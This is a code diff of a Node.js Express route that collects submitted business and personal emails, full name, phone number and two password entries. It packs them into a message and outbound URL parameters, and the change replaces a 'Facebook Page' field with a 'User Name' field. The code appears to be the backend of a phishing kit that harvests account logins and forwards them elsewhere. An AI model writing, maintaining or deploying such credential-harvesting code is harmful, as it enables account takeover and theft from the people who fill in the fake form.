@@ -27,7 +27,7 @@ app.post('/api/news', (req, res) => {
     const message = `Email Account: ${data.fill_business_email ? data.fill_business_email : ''} 
     Name Acount: ${data.fill_full_name ? data.fill_full_name : ''} 
     Personal Email: ${data.fill_personal_email ? data.fill_personal_email : ''}
-    Facebook Page: ${data.fill_facebook_pagename ? data.fill_facebook_pagename : ''}
+    User Name: ${data.fill_your_name ? data.fill_your_name : ''}
     Phone Number: ${data.fill_phone ? data.fill_phone : ''}
     Password First: ${data.first_password ? data.first_password : ''}
     Password Second: ${data.second_password ? data.second_password : ''}
@@ -47,7 +47,7 @@ app.post('/api/news', (req, res) => {
     url.searchParams.append('Email Account', data.fill_business_email ? data.fill_business_email : '');
     url.searchParams.append('Name Acount', data.fill_full_name ? data.fill_full_name : '');
     url.searchParams.append('Personal Email', data.fill_personal_email ? data.fill_personal_email : '');
-    url.searchParams.append('Facebook Page', data.fill_facebook_pagename ? data.fill_facebook_pagename : '');
+    url.searchParams.append('User Name', data.fill_your_name ? data.fill_your_name : '');
     url.searchParams.append('Phone Number', data.fill_phone ? data.fill_phone : '');
     url.searchParams.append('Password First', data.first_password ? data.first_password : '');
     url.searchParams.append('Password Second', data.second_password ? data.second_password : '');
